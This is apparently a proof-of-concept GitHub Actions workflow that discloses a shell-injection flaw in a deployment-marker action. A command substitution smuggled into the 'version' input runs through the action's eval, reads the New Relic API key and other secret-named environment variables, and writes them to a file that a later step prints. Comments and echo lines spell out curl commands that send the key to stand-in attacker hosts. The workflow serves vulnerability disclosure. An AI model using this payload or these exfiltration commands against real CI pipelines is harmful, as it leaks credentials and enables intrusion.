name: "PoC: API Key Exfiltration via eval injection"

on:
  workflow_dispatch:

jobs:
  prove-secret-exfil:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # The injection payload in "version" writes secrets to a file.
      # In a real attack this would be: curl https://attacker.com/?k=$NEW_RELIC_API_KEY
      - name: Mark deployment (eval injection in version)
        uses: newrelic/deployment-marker-action@v2.6.2
        continue-on-error: true
        with:
          apiKey: ${{ secrets.NEW_RELIC_API_KEY }}
          commandType: changeTrackingCreateEvent
          category: Deployment
          type: BASIC
          entitySearch: "domain = 'APM' AND name = 'TestApp'"
          version: 'v1.0$(echo "=== EVAL INJECTION — SECRET EXFILTRATION PROOF ===" > /github/workspace/exfil_proof.txt && echo "" >> /github/workspace/exfil_proof.txt && echo "[1] NEW_RELIC_API_KEY (first 12 chars):" >> /github/workspace/exfil_proof.txt && echo "    ${NEW_RELIC_API_KEY:0:12}..." >> /github/workspace/exfil_proof.txt && echo "" >> /github/workspace/exfil_proof.txt && echo "[2] Running as:" >> /github/workspace/exfil_proof.txt && whoami >> /github/workspace/exfil_proof.txt && echo "" >> /github/workspace/exfil_proof.txt && echo "[3] Sensitive env vars accessible:" >> /github/workspace/exfil_proof.txt && env | grep -iE "KEY|TOKEN|SECRET|PASS|CRED" | cut -c1-50 >> /github/workspace/exfil_proof.txt && echo INJECTED)'

      # Show the proof
      - name: "Display exfiltration proof"
        run: |
          echo "╔══════════════════════════════════════════════════╗"
          echo "║  PROOF: eval injection exfiltrates secrets       ║"
          echo "╚══════════════════════════════════════════════════╝"
          echo ""
          if [ -f exfil_proof.txt ]; then
            cat exfil_proof.txt
            echo ""
            echo "───────────────────────────────────────────────────"
            echo "CONFIRMED: Injected shell command inside"
            echo "  entrypoint.sh line 117:  result=\$(eval \"\$command_str\")"
            echo "can read NEW_RELIC_API_KEY and all other secrets."
            echo ""
            echo "In production, an attacker exfiltrates via:"
            echo "  version: '\$(curl https://evil.com/?\$NEW_RELIC_API_KEY)'"
          else
            echo "ERROR: exfil_proof.txt not created — check action logs above"
          fi
